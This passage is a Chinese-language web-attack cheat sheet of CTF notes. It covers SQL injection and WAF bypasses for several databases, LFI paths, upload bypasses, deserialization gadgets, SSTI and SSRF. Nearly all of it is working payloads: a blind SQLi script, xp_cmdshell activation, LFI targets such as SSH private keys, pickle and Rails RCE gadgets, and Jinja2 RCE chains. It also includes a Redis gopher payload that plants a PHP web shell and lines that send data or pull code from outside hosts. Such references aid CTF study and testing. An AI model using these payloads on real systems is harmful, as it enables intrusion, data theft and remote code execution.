    - 可以透过`asc`、`desc`简单判断
        - `?sort=1 asc`
        - `?sort=1 desc`
    - 后面不能接UNION
    - 已知字段名 (可以盲注)
        - `?order=IF(1=1, username, password)`
    - 利用报错
        - `?order=IF(1=1,1,(select 1 union select 2))` 正确
        - `?order=IF(1=2,1,(select 1 union select 2))` 错误
        - `?order=IF(1=1,1,(select 1 from information_schema.tables))` 正常
        - `?order=IF(1=2,1,(select 1 from information_schema.tables))` 错误
    - Time Based
        - `?order=if(1=1,1,(SELECT(1)FROM(SELECT(SLEEP(2)))test))` 正常
        - `?order=if(1=2,1,(SELECT(1)FROM(SELECT(SLEEP(2)))test))` sleep 2秒

- group by with rollup
    - `' or 1=1 group by pwd with rollup limit 1 offset 2#`

- 将字符串转成纯数字
    - 字符串 -> 16进制 -> 10进制
    - `conv(hex(YOUR_DATA), 16, 10)`
    - 还原：`unhex(conv(DEC_DATA,10,16))`
    - 需注意不要Overflow

- 不使用逗号
    - `LIMIT N, M` => `LIMIT M OFFSET N`
    - `mid(user(), 1, 1)` => `mid(user() from 1 for 1)`
    - `UNION SELECT 1,2,3` => `UNION SELECT * FROM ((SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c)`

- 快速查找带关键字的表
    - `select table_schema,table_name,column_name from information_schema.columns where table_schema !=0x696E666F726D6174696F6E5F736368656D61 and table_schema !=0x6D7973716C and table_schema !=0x706572666F726D616E63655F736368656D61 and (column_name like '%pass%' or column_name like '%pwd%');
    `

- innodb
    - 表引擎为innodb
    - MySQL > 5.5
    - innodb_table_stats、innodb_table_index存放所有库名表名
    - `select table_name from mysql.innodb_table_stats where database_name=资料库名;`
    - Example: [Codegate2018 prequal - simpleCMS](https://github.com/w181496/CTF/tree/master/codegate2018-prequal/simpleCMS)

- Bypass WAF

    - `select password` => `SelEcT password` (大小写)
    - `select password` => `select/**/password` (绕空白)
    - `select password` => `s%65lect%20password` (URLencode)
    - `select password` => `select(password)` (绕空白)
    - `select password` => `select%0apassword` (绕空白)
        - %09, %0a, %0b, %0c, %0d, %a0
    - `select password from admin` => `select password /*!from*/ admin` (MySQL注解)
    - `information_schema.schemata` => ``` `information_schema`.schemata ``` (绕关键字/空白)
        - ``` select xxx from`information_schema`.schemata``` 
    - `select pass from user where id='admin'` => `select pass from user where id=0x61646d696e` (绕引号)
        - `id=concat(char(0x61),char(0x64),char(0x6d),char(0x69),char(0x6e))`
    - `?id=0e2union select 1,2,3` (科学记号)
        - `?id=1union select 1,2,3`会烂
        - `?id=0e1union(select~1,2,3)` (~)
        - `?id=.1union select 1,2,3` (点)
    - `WHERE` => `HAVING` (绕关键字)
    - `AND` => `&&` (绕关键字)
        - `OR` => `||`
        - `=` => `LIKE`
        - `a = 'b'` => `not a > 'b' and not a < 'b'`
        - `> 10` => `not between 0 and 10`
    - `LIMIT 0,1` => `LIMIT 1 OFFSET 0` (绕逗号)
        - `substr('kaibro',1,1)` => `substr('kaibro' from 1 for 1)`
    - Multipart/form-data绕过
        - http://xdxd.love/2015/12/18/%E9%80%9A%E8%BF%87multipart-form-data%E7%BB%95%E8%BF%87waf/
    - 伪造User-Agent
        - e.g. 有些WAF不封google bot

## MSSQL

- 子字符串：
    - `SUBSTRING("abc", 1, 1) => 'a'`
- Ascii function
    - `ascii('A') => 65 `
- Char function
    - `char(65) => 'a'`
- Concatenation
    - `+`
    - `'a'+'b' => 'ab'`
- Delay function
    - `WAIT FOR DELAY '0:0:10'`
- 空白字元
    - `01,02,03,04,05,06,07,08,09,0A,0B,0C,0D,0E,0F,10,11,12,13,14,15,16,17,18,19,1A,1B,1C,1D,1E,1F,20`
- IF语句
    - IF condition true-part ELSE false-part
    - `IF (1=1) SELECT 'true' ELSE SELECT 'false'`
- 注解：
    - `--`
    - `/**/`
- TOP
    - MSSQL没有`LIMIT N, M`的用法
    - `SELECT TOP 87 * FROM xxx` 取最前面87笔
    - 取第78~87笔
        - `SELECT pass FROM (SELECT pass, ROW_NUMBER() OVER (ORDER BY (SELECT 1)) AS LIMIT FROM mydb.dbo.mytable)x WHERE LIMIT between 78 and 87`
- 其它：
    - db_name()
    - user_name()
    - @@servername
    - host_name()
- 爆DB name
    - ```DB_NAME(N)```
    - ```UNION SELECT NULL,DB_NAME(N),NULL--```
    - ```UNION SELECT NULL,name,NULL FROM master ..sysdatabases--```
    - `SELECT catalog_name FROM information_schema.schemata`
    - ```1=(select name from master.dbo.sysdatabases where dbid=5)```
- 爆表名
    - `SELECT table_catalog, table_name FROM information_schema.tables`
    - `SELECT name FROM sysobjects WHERE xtype='U'`
    - `ID=02';if (select top 1 name from DBname..sysobjects where xtype='U' and name not in ('table1', 'table2'))>0 select 1--`

- 爆column
    - `SELECT table_catalog, table_name, column_name FROM information_schema.columns`
    - `SELECT name FROM syscolumns WHERE id=object_id('news')`
    - `ID=1337';if (select top 1 col_name(object_id('table_name'), i) from sysobjects)>0 select 1--`
- Union Based
    - Column型态必须相同
    - 可用`NULL`来避免
- Error Based
    - 利用型别转换错误
    - `id=1 and user=0`

- 判断是否站库分离
    - 客户端主机名：`select host_name();`
    - 服务端主机名：`select @@servername; `
    - 两者不同即站库分离

- xp_cmdshell
    - 在MSSQL 2000默认开启
    - MSSQL 2005之后默认关闭
    - 有sa权限，可透过sp_configure重启它
    
    ```
    EXEC sp_configure 'show advanced options',1
    RECONFIGURE 
    EXEC sp_configure 'xp_cmdshell',1
    RECONFIGURE
    ```
    - 关闭xp_cmdshell
    
    ```
    EXEC sp_configure 'show advanced options', 1;
    RECONFIGURE;
    EXEC sp_configure'xp_cmdshell', 0;
    RECONFIGURE;
    ```

    - 执行系统命令

    ```
    EXEC master..xp_cmdshell 'whoami';
    ```

- 快速查找带关键字的表
    - `SELECT sysobjects.name as tablename, syscolumns.name as columnname FROM sysobjects JOIN syscolumns ON sysobjects.id = syscolumns.id WHERE sysobjects.xtype = 'U' AND (syscolumns.name LIKE '%pass%' or syscolumns.name LIKE '%pwd%' or syscolumns.name LIKE '%first%');`

- Unicode绕过
    - IIS 对 Unicode 编码是可以解析的，即 s%u0065lect 会被解析为 select

## Oracle

- `SELECT`语句必须包含`FROM`
    - 用`dual`表
- 子字符串：
    - `SUBSTR("abc", 1, 1) => 'a'`
- 空白字元
    - `00 0A 0D 0C 09 20`
- IF语句
    - `IF condition THEN true-part [ELSE false-part] END IF`
- 注解：
    - `--`
- 其它
    - `SYS.DATABASE_NAME`
        - current database
    - `USER`
        - current user
    - `SELECT banner FROM v$version where rownum=1`
        - database version
- 库名
    - `SELECT DISTINCT OWNER FROM ALL_TABLES`
- 表名
    - `SELECT OWNER, TABLE_NAME FROM ALL_TABLES`
- Column
    - `SELECT OWNER, TABLE_NAME, COLUMN_NAME FROM ALL_TAB_COLUMNS`
- Union Based
    - Column型态必须相同
    - 可用`NULL`来避免
    - `UNION SELECT 1, 'aa', null FROM dual`
- Error Based
    - `SELECT * FROM news WHERE id=1 and CTXSYS.DRITHSX.SN(user, (SELECT banner FROM v$version WHERE rownum=1))=1`
- Out of band
    - `UTL_HTTP.request('http://rs.panja.cc/'||(select user from dual))=1`

## SQLite

- 子字符串：
    - `substr(“abc",1,1)   =>   'a'`
- Ascii function:
    - `unicode('d') => 100`
- legth
    - `length('ab') => 2`
- Concatenation
    - `||`
    - `'a' || 'b' => 'ab'` 
- Time Delay
    - `randomblob(100000000)`
- 空白字元
    - `0A 0D 0C 09 20`
- Case when
    - SQLite没有`if`
    - 可以用`Case When ... Then ...`代替
    - `case when (条件) then ... else ... end`
- 注解
    - `--`
- 爆表名
    - `SELECT name FROM sqlite_master WHERE type='table'`
- 爆表结构(含Column)
    - `SELECT sql FROM sqlite_master WHERE type='table'`
- 其他
    - `sqlite_version()`
    - sqlite无法使用`\'`跳脱单引号
- Boolean Based: SECCON 2017 qual SqlSRF

<details>
    <summary><b>Click here to view script</b></summary>

```ruby
# encoding: UTF-8

# sqlite injection (POST method) (二分搜)
# SECCON sqlsrf爆admin密码 
require 'net/http'
require 'uri'

$url = 'http://sqlsrf.pwn.seccon.jp/sqlsrf/index.cgi'
$ans = ''

(1..100).each do |i|
    l = 48
    r = 122

    while(l <= r)
        #puts "left: #{l}, right: #{r}"
        break if l == r

        mid = ((l + r) / 2)
        $query = "kaibro'union select '62084a9fa8872a1b917ef4442c1a734e' where (select unicode(substr(password,#{i},#{i})) from users where username='admin') > #{mid} and '1'='1"
        
        res = Net::HTTP.post_form URI($url), {"user" => $query, "pass" => "kaibro", "login" => "Login"}
        
        if res.body.include? 'document.location'
            l = mid + 1
        else
            r = mid
        end

    end
    $ans += l.chr
    puts $ans

end

```

</details>

## PostgreSQL

- 子字符串
    - `substr("abc", 1, 1) => 'a'`
- Ascii function
    - `ascii('x') => 120`
- Char function
    - `chr(65) => A`
- Concatenation
    - `||`
    - `'a' || 'b' => 'ab'`
- Delay function
    - `pg_sleep(5)`
    - `GENERATE_SERIES(1, 1000000)`
- 空白字元
    - `0A 0D 0C 09 20`
- encode / decode
    - `encode('123\\000\\001', 'base64')` => `MTIzAAE=`
    - `decode('MTIzAAE=', 'base64')` => `123\000\001`
- 不支持limit N, M
    - `limit a offset b` 略过前b笔，抓出a笔出来
- 注解
    - `--`
    - `/**/`
- 爆库名
    - `SELECT datname FROM pg_database`
- 爆表名
    - `SELECT tablename FROM pg_tables WHERE schemaname='dbname'`
- 爆Column
    - `SELECT column_name FROM information_schema.columns WHERE table_name='admin'`
- Dump all 
    - `array_to_string(array(select userid||':'||password from users),',')`
- 其它
    - version()
    - current\_database()
    - user
        - current_user
        - `SELECT usename FROM pg_user;`
    - current\_schema
    - current\_query()
    - inet\_server\_addr()
    - inet\_server\_port()
    - inet\_client\_addr()
    - inet\_client\_port()
    - type conversion
        - `cast(count(*) as text)`
    - `md5('abc')`
    - `replace('abcdefabcdef', 'cd', 'XX')` => `abXXefabXXef`
    - `pg_read_file(filename, offset, length)`
        - 读档
        - 只能读data_directory下的
    - `pg_ls_dir(dirname)`
        - 列目录内容
        - 只能列data_directory下的
    - PHP的`pg_query()`可以多語句執行

## ORM injection

https://www.slideshare.net/0ang3el/new-methods-for-exploiting-orm-injections-in-java-applications

- Hibernate
    - 单引号跳脱法
        - MySQL中，单引号用`\'`跳脱
        - HQL中，用两个单引号`''`跳脱
        - `'abc\''or 1=(SELECT 1)--'`
            - 在HQL是一个字符串
            - 在MySQL是字符串+额外SQL语句
    - Magic Function法
        - PostgreSQL中内建`query_to_xml('Arbitary SQL')`
        - Oracle中有`dbms_xmlgen.getxml('SQL')`

HQL injection example (pwn2win 2017)

- ```order=array_upper(xpath('row',query_to_xml('select (pg_read_file((select table_name from information_schema.columns limit 1)))',true,false,'')),1)```
    - Output: `ERROR: could not stat file "flag": No such file or directory`

- ```order=array_upper(xpath('row',query_to_xml('select (pg_read_file((select column_name from information_schema.columns limit 1)))',true,false,'')),1)```
    - Output: `ERROR: could not stat file "secret": No such file or directory`
- `order=array_upper(xpath('row',query_to_xml('select (pg_read_file((select secret from flag)))',true,false,'')),1)`
    - Output: `ERROR: could not stat file "CTF-BR{bl00dsuck3rs_HQL1njection_pwn2win}": No such file or directory`


## SQL Injection with MD5

- `$sql = "SELECT * FROM admin WHERE pass = '".md5($password, true)."'";`
- ffifdyop
    - md5: `276f722736c95d99e921722cf9ed621c`
    - to string: `'or'6<trash>`

## HTTP Parameter Pollution

- `id=1&id=2&id=3`
    - ASP.NET + IIS: `id=1,2,3`
    - ASP + IIS: `id=1,2,3`
    - PHP + Apache: `id=3`

## SQLmap

- https://github.com/sqlmapproject/sqlmap/wiki/Usage
- Usage
    - `python sqlmap.py -u 'test.rs.panja.cc/a.php?id=1'`
        - 库名: `--dbs`
        - 表名: `-D dbname --tables`
        - column: `-D dbname -T tbname --columns`
        - dump: `-D dbname -T tbname --dump`
            - `--start=1`
            - `--stop=1234`
        - DBA? `--is-dba`
        - 爆帐密: `--passwords`
        - 看权限: `--privileges`
        - 拿shell: `--os-shell`
        - interative SQL: `--sql-shell`
        - 读档: `--file-read=/etc/passwd`
        - Delay时间: `--time-sec=10`
        - User-Agent: `--random-agent`
        - Thread: `--threads=10`
        - Level: `--level=3`
            - default: 1
        - `--technique`
            - default: `BEUSTQ`
        - Cookie: `--cookie="abc=12347788"`
        - Tor: `--tor --check-tor --tor-type=SOCKS5 --tor-port=9050`

# LFI

## Testing Payload

### Linux / Unix

- `./index.php`
- `././index.php`
- `.//index.php`
- `../../../../../../etc/passwd`
- `../../../../../../etc/passwd%00`
    - 仅在5.3.0以下可用
    - magic_quotes_gpc需为OFF
- `%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd`
- `ＮＮ/ＮＮ/ＮＮ/etc/passwd`
- `/var/log/apache2/error.log`
- `/var/log/httpd/access_log`
- `/var/log/mail.log`
- `/usr/local/apache2/conf/httpd.conf`
- `/etc/apache2/apache2.conf`
- `/etc/apache2/sites-available/000-default.conf`
- `/usr/local/etc/apache2/httpd.conf`
- `/etc/nginx/conf.d/default.conf`
- `/etc/nginx/nginx.conf`
- `/etc/nginx/sites-enabled/default`
- `/etc/nginx/sites-enabled/default.conf`
- `.htaccess`
- `/root/.bash_history`
- `/root/.ssh/id_rsa`
- `/root/.ssh/authorized_keys`

### Windows

- `C:/Windows/win.ini`
- `C:/boot.ini`
- `C:/apache/logs/access.log`
- `../../../../../../../../../boot.ini/.......................`
- `C:/windows/system32/drivers/etc/hosts`

## 环境变量

- `../../../../proc/self/environ`
    - HTTP_User_Agent塞php script

## log文件

- apache log
- mysql log
- mail log
- ssh log
    - `/var/log/auth.log`


## php://filter

- `php://filter/convert.base64-encode/resource=index.php`
- `php://filter/read=string.rot13/resource=index.php`

## php://input

- `?page=php://input`
    - post data: `<?php system("net user"); ?>`
    - 需要有开启`url_allow_include`，5.4.0直接废除

## phpinfo

- 对server以form-data上传文件，会产生tmp文件
- 利用phpinfo得到tmp文件路径和名称
- LFI Get shell
- 限制
    - Ubuntu 17后，默认开启`PrivateTmp`，无法利用

## php session

- Session一般存在`sess_{PHPSESSID}`中
- 可以透过修改Cookie再LFI拿shell
- 以下为常见存放路径
    - /var/tmp/
    - /tmp/
    - /var/lib/php5/
    - /var/lib/php/
- `session.upload_progress`
    - PHP預設開啟
    - 用來監控上傳檔案進度
    - 當`session.upload_progress.enabled`開啟，可以POST在`$_SESSION`中添加資料 (`sess_{PHPSESSID}`)
    - 配合LFI可以getshell
    - `session.upload_progress.cleanup=on`時，可以透過Race condition
    - Example
        - HITCON CTF 2018 - One Line PHP Challenge

## data://

- 条件
    - allow_url_fopen: On
    - allow_url_include: On
- 用法
    - `?file=data://text/plain,<?php phpinfo()?>`
    - `?file=data:text/plain,<?php phpinfo()?>`
    - `?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=`

## zip / phar

- 适用验证副档名时
- zip
    - 新建zip，裡头压缩php脚本(可改副档名)
    - `?file=zip://myzip.zip#php.jpg`
- phar
    - ```php
        <?php
            $p = new PharData(dirname(__FILE__).'/phartest.zip',0,'phartest2',Phar::ZIP);
            $x = file_get_contents('./a.php');
            $p->addFromString('b.jpg', $x);
        ?>
    - 构造 `?file=phar://phartest.zip/b.jpg`

## SSI (Server Side Includes)

- 通常放在`.shtml`, `.shtm`
- Execute Command
    - `<!--#exec cmd="command"-->`
- File Include
    - `<!--#include file="../../web.config"-->`
- Example
    - HITCON CTF 2018 - Why so Serials?

## PHP open_basedir bypass

```
chdir('img');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');echo(file_get_contents('flag'));
```

# 上传漏洞

## Javascript检测

- Burp Suite 中间修改
- disable javascript

## Bypass MIME Detection

- Burp修改Content-Type

## 黑名单判断后缀名

- 大小写绕过
    - pHP
    - AsP 
- 空格 / 点 绕过
    - Windows特性
    - .php(空格)  // burp修改
    - .asp.
- php3457
    - .php3
    - .php4
    - .php5
    - .php7
    - .pht
    - .phtml
- .htaccess
    ```
    <FilesMatch "kai">
    SetHandler application/x-httpd-php
    </FilesMatch>
    ```
- 文件解析漏洞

## Magic Number

- jpg
    - `FF D8 FF E0 00 10 4A 46 49 46`
- gif
    - `47 49 36 38 39 61`
- png
    - `89 50 4E 47`

## 其他
- 常见场景：配合文件解析漏洞

# 反序列化

## PHP - Serialize() / Unserialize()

- `__construct()`
    - Object被new时调用，但unserialize()不调用
- `__destruct()`
    - Object被销毁时调用
- `__wakeup()`
    - unserialize时自动调用
- `__sleep()`
    - 被serialize时调用
- `__toString()`
    - 物件被当成字符串时调用

<br>

- Value
    - String
        - `s:size:value;`
    - Integer
        - `i:value;`
    - Boolean
        - `b:value;` ('1' or '0')
    - NULL
        - `N;`
    - Array
        - `a:size:{key definition; value definition; (repeat per element)}`
    - Object
        - `O:strlen(class name):class name:object size:{s:strlen(property name):property name:property definition;(repeat per property)}`
    - 其他
        - C - custom object
        - R - pointer reference


- Public / Private / Protected 序列化

    - 例如：class名字为: `Kaibro`，变量名字: `test`

    - 若为Public，序列化后：
        - `...{s:4:"test";...}`
    - 若为Private，序列化后：
        - `...{s:12:"%00Kaibro%00test"}`
    - 若为Protected，序列化后：
        - `...{s:7:"%00*%00test";...}`
    - Private和Protected会多两个NULL byte

---

- Example
    
```php
    <?php

    class Kaibro {
        public $test = "ggininder";
        function __wakeup()
        {
            system("echo ".$this->test);
        }
    }

    $input = $_GET['str'];
    $kb = unserialize($input);
```

- Input: `.php?str=O:6:"Kaibro":1:{s:4:"test";s:3:";id";}`
- Output: `uid=33(www-data) gid=33(www-data) groups=33(www-data) `

<br>

- Example 2 - Private

```php
    <?php

    class Kaibro {
        private $test = "ggininder";
        function __wakeup()
        {
            system("echo ".$this->test);
        }
    }

    $input = $_GET['str'];
    $kb = unserialize($input);

```

- Input: `.php?str=O:6:"Kaibro":1:{s:12:"%00Kaibro%00test";s:3:";id";}`

- Output: `uid=33(www-data) gid=33(www-data) groups=33(www-data)`

---

- CVE-2016-7124
    - 影响版本：
        - PHP5 < 5.6.25
        - PHP7 < 7.0.10
    - 物件属性个数大于真正的属性个数，会略过`__wakeup`的执行
    - 反序列化会失败，但是`__destruct`会执行
    - HITCON 2016

- 小特性
    - `O:+4:"test":1:{s:1:"a";s:3:"aaa";}`
    - `O:4:"test":1:{s:1:"a";s:3:"aaa";}`
    - 两者结果相同

- Phar:// 反序列化
    - phar文件會將使用者自定義的metadata以序列化形式保存
    - 透過`phar://`偽協議可以達到反序列化的效果
    - 常見影響函數: `file_get_contents()`, `file_exists()`, `is_dir()`, ...
    - Generic Gadget Chains
        - [phpggc](https://github.com/ambionics/phpggc)
    - Example
        - HITCON CTF 2017 - Baby^H Master PHP 2017
        - HITCON CTF 2018 - Baby Cake
        - DCTF 2018 - Vulture

## Python Pickle

- `dumps()` 将物件序列化成字符串
- `loads()` 将字符串反序列化

Example:

a.py:

```python
import os
import cPickle
import sys
import base64

class Exploit(object):
    def __reduce__(self):
        return (os.system, ('id',))
    
shellcode = cPickle.dumps(Exploit())
print base64.b64encode(shellcode)
```

b.py:

```python
import os
import cPickle
import sys
import base64

s = raw_input(":")

print cPickle.loads(base64.b64decode(s))
```

```
$ python a.py > tmp
$ cat tmp | python b.py
uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),110(lxd)
```

## Ruby/Rails Marshal

this one is not self-executing

this one actually relies on rails invoking a method on the resulting object after the deserialization

```ruby
erb = ERB.allocate
erb.instance_variable_set :@src, "`id`"
depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new erb, :result, "foo", ActiveSupport::Deprecation
hash = {depr => 'something'}
marshalled = Marshal.dump(hash)
print marshalled
```

在ERB上，当result或run method被call时，@src的string会被执行

- 常见使用情境：
    - 以Marshal为Cookie Serializer时，若有`secret_key`，则可以伪造Cookie
    - 也可以透过`DeprecatedInstanceVariableProxy`去执行ERB的`result`来RCE
        - 当`DeprecatedInstanceVariableProxy`被unmarshal，rails session对他处理时遇到不认识的method就会呼叫`method_missing`，导致执行传入的ERB
        - `@instance.__send__(@method)`

- Cookie Serializer
    - Rails 4.1以前的Cookie Serializer为Marshal
    - Rails 4.1开始，默认使用JSON

## Ruby/Rails YAML

- CVE-2013-0156
    - 旧版本的Rails中，`XML`的node可以自订type，如果指定为`yaml`，是会被成功解析的
    - 若反序列化`!ruby/hash`，则相当于在物件上调用`obj[key]=val`，也就是`[]=`方法
    - 而这个`ActionDispatch::Routing::RouteSet::NamedRouteCollection`中的`[]=`方法中，有一条代码路径可以eval
    - `define_hash_access`中可以看到`module_eval`，里头的`selector`来自`name`
    - 因为他还会对`value`调用`defaults` method，所以可以利用`OpenStruct`来构造
        - `函数名=>返回值`的对应关系存放在`@table`中
    - Payload:
    ```ruby
    xml = %{  
    <?xml version="1.0" encoding="UTF-8"?>  
    <bingo type='yaml'>  
    ---| !ruby/hash:ActionDispatch::Routing::RouteSet::NamedRouteCollection  
    'test; sleep(10); test' :  
     !ruby/object:OpenStruct  
      table:  
       :defaults: {}  
    </bingo>

    }.strip
    ```
- CVE-2013-0333
    - Rails 2.3.x和3.0.x中，允许`text/json`的request转成`YAML`解析
    - `Yaml`在Rails 3.0.x是预设的`JSON Backend`
    - 出问题的地方在于`YAML.load`前的`convert_json_to_yaml`，他不会检查输入的JSON是否合法
    - 一样可以透过`ActionController::Routing::RouteSet::NamedRouteCollection#define_hash_access`的`module_eval`来RCE

## Java Deserialization

- https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet

## .NET Derserialization

- [ysoserial.net](https://github.com/pwntester/ysoserial.net)
- asp.net中ViewState以序列化形式保存資料
    - 有machinekey或viewstate未加密/驗證時，可以RCE
- Example
    - HITCON CTF 2018 - Why so Serials?

# SSTI 

Server-Side Template Injection

![img](https://i.imgur.com/GVZeVq6.png)

## Testing
- ` {{ 7*'7' }}`
    - Twig: `49`
    - Jinja2: `7777777`
- `<%= 7*7 %>`
    - Ruby ERB: `49`
- `<%="#{1234*1234}"%>`
    - Ruby ERB
- `="#{1234*1234}"`
    - Ruby ERB

## Flask/Jinja2
- Dump all used classes
    - `{{ ''.__class__.__mro__[2].__subclasses__() }}
`
- Read File
    - `{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}`
- Write File
    - `{{''.__class__.__mro__[2].__subclasses__()[40]('/var/www/app/a.txt', 'w').write('Kaibro Yo!')}}`
- RCE
    - `{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }}`
        - evil config
    - `{{ config.from_pyfile('/tmp/evilconfig.cfg') }}`
        - load config
    - `{{ config['RUNCMD']('cat flag',shell=True) }}`

- RCE (another way)
    - `{{''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen('ls').read()}}`
- 过滤中括号
    - `__getitem__`
    - `{{''.__class__.__mro__.__getitem__(2)}}`
        - `{{''.__class__.__mro__[2]}}`
- 过滤`{{` or `}}`
    - 用`{%%}`
    - 执行结果往外传
- 过滤`.`
    - `{{''.__class__}}`
        - `{{''['__class__']}}`
        - `{{''|attr('__class__')}}`
- 用request绕
    - `{{''.__class__}}`
        - `{{''[request.args.kaibro]}}&kaibro=__class__`

## AngularJS
- v1.6后移除Sandbox
- Payload
    - `{{ 7*7 }}` => 49
    - `{{ this }}`
    - `{{ this.toString() }}`
    - `{{ constructor.toString() }}`
    - `{{ constructor.constructor('alert(1)')() }}` 2.1 v1.0.1-v1.1.5
    - `{{ a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')() }}` 2.1 v1.0.1-v1.1.5
    - `{{ toString.constructor.prototype.toString=toString.constructor.prototype.call;["a","alert(1)"].sort(toString.constructor)  }}` 2.3 v1.2.19-v1.2.23
    - `{{'a'.constructor.prototype.charAt=''.valueOf;$eval("x='\"+(y='if(!window\\u002ex)alert(window\\u002ex=1)')+eval(y)+\"'");}}` v1.2.24-v1.2.29
    - `{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}` v1.3.20
    - `{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}` v1.4.0-v1.4.9
    - `{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)');}}` v1.5.0-v1.5.8
    - `{{ [].pop.constructor('alert(1)')() }}` 2.8 v1.6.0-1.6.6

## Vue.js
- `{{constructor.constructor('alert(1)')()}}`
- https://github.com/dotboris/vuejs-serverside-template-xss

## Python
- `%`
    - 输入`%(passowrd)s`即可偷到密码：
    ```python
    userdata = {"user" : "kaibro", "password" : "ggininder" }
    passwd  = raw_input("Password: ")
    if passwd != userdata["password"]:
        print ("Password " + passwd + " is wrong")
    ```
- `f`
    - python 3.6
    - example
        - `a="gg"`
        - `b=f"{a} ininder"`
            - `>>> gg ininder`
    - example2
        - `f"{os.system('ls')}"`

## Tool
- https://github.com/epinna/tplmap

---

http://blog.portswigger.net/2015/08/server-side-template-injection.html

# SSRF

## Bypass 127.0.0.1 

```
127.0.0.1
localhost
127.0.1
127.1
0.0.0.0
0.0
0

::1
::127.0.0.1
::ffff:127.0.0.1
::1%1

127.12.34.56 (127.0.0.1/8)
127.0.0.1.xip.io

http://2130706433 (decimal)
http://0x7f000001
http://017700000001
http://0x7f.0x0.0x0.0x1
http://0177.0.0.1
http://0177.01.01.01
http://0x7f.1
http://[::]
http://www.example.com@127.0.0.1
http://127.0.0.1:80
http://127。0。0。1

DNS重绑定
```

## Bypass using Ⓐ Ⓑ Ⓒ Ⓓ

- `http://ⓀⒶⒾⒷⓇⓄ.ⓉⓌ`
- `http://ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ`

## 内网IP

- `10.0.0.0/8`
- `172.16.0.0/12`
- `192.168.0.0/16`

## XSPA

- port scan
    - `127.0.0.1:80` => OK
    - `127.0.0.1:87` => Timeout
    - `127.0.0.1:9487` => Timeout

## 302 Redirect Bypass

- 用来绕过protocol限制
- 第一次SSRF，网站有做检查、过滤
- 302跳转做第二次SSRF没有检查

## 本地利用

- file protocol
    - `file:///etc/passwd`
    - `file:///proc/self/cmdline`
        - 看他在跑啥
    - `file:///proc/self/exe`
        - dump binary
    - `file:///proc/self/environ`
        - 读环境变量
    - `curl file://google.com/etc/passwd`
        - 新版已修掉
        - 实测libcurl 7.47可work
    - Java原生可列目录
    - Perl/Ruby open Command Injection

## 远程利用
- Gopher
    - 可伪造任意TCP
    - `gopher://127.0.0.1:5278/xGG%0d%0aININDER`
- 常见例子
    - Struts2
        - S2-016
            - `action:`、`redirect:`、`redirectAction:`
            - `index.do?redirect:${new java.lang.ProcessBuilder('id').start()}`
    - ElasticSearch
        - default port: `9200`
    - Redis
        - default port: `6379`
        - 用SAVE写shell
        ```
            FLUSHALL 
            SET myshell "<?php system($_GET['cmd']) ?>"
            CONFIG SET DIR /www 
            CONFIG SET DBFILENAME shell.php 
            SAVE
            QUIT
        ```
        - URLencoded payload:
        `gopher://127.0.0.1:6379/_FLUSHALL%0D%0ASET%20myshell%20%22%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%3F%3E%22%0D%0ACONFIG%20SET%20DIR%20%2fwww%2f%0D%0ACONFIG%20SET%20DBFILENAME%20shell.php%0D%0ASAVE%0D%0AQUIT`
    - FastCGI
        - default port: 9000
        - example
            - Discuz Pwn
                - 302.php: `<?php
                                header( "Location: gopher://127.0.0.1:9000/x%01%01Zh%00%08%00%00%00%01%00%00%00%00%00%00%01%04Zh%00%8b%00%00%0E%03REQUEST_METHODGET%0F%0FSCRIPT_FILENAME/www//index.php%0F%16PHP_ADMIN_VALUEallow_url_include%20=%20On%09%26PHP_VALUEauto_prepend_file%20=%20http://rs.panja.cc/x%01%04Zh%00%00%00%00%01%05Zh%00%00%00%00" );`
                - x: `<?php system($_GET['cmd']); ?>`
                - visit: `/forum.php?mod=ajax&action=downremoteimg&message=[img]http://rs.panja.cc/302.php?.jpg[/img]`
    - MySQL
        - 无密码认证可以SSRF
        - MySQL Client与Server交互主要分两阶段
            - Connection Phase
            - Command Phase
        - `gopher://127.0.0.1:3306/_<PAYLOAD>`

    - Docker 
        - Remote api未授权访问
            - 开一个container，挂载/root/，写ssh key
            - 写crontab弹shell

    - ImageMagick - CVE-2016-3718
        - 可以发送HTTP或FTP request
        - payload: ssrf.mvg
        ```
        push graphic-context
        viewbox 0 0 640 480
        fill 'url(http://example.com/)'
        pop graphic-context
        ```
        - `$ convert ssrf.mvg out.png`
    

## CRLF injection

### SMTP

SECCON 2017 SqlSRF:

`127.0.0.1 %0D%0AHELO sqlsrf.pwn.seccon.jp%0D%0AMAIL FROM%3A %3Ckaibrotw%40gmail.com%3E%0D%0ARCPT TO%3A %3Croot%40localhost%3E%0D%0ADATA%0D%0ASubject%3A give me flag%0D%0Agive me flag%0D%0A.%0D%0AQUIT%0D%0A:25/`

## FingerPrint

- dict
```
dict://evil.com:1234

$ nc -vl 1234
Listening on [0.0.0.0] (family 0, port 5278)
Connection from [x.x.x.x] port 1234 [tcp/*] accepted (family 2, sport 40790)
CLIENT libcurl 7.35.0

-> libcurl version
```
- sftp
```
sftp://evil.com:1234

$ nc -vl 1234
Listening on [0.0.0.0] (family 0, port 5278)
Connection from [x.x.x.x] port 5278 [tcp/*] accepted (family 2, sport 40810)
SSH-2.0-libssh2_1.4.2

-> ssh version
```

- Content-Length
    - 送超大Content-length
    - 连线hang住判断是否为HTTP Service

## UDP

- tftp
    - `tftp://evil.com:1234/TEST`
    - syslog

---

SSRF Bible:

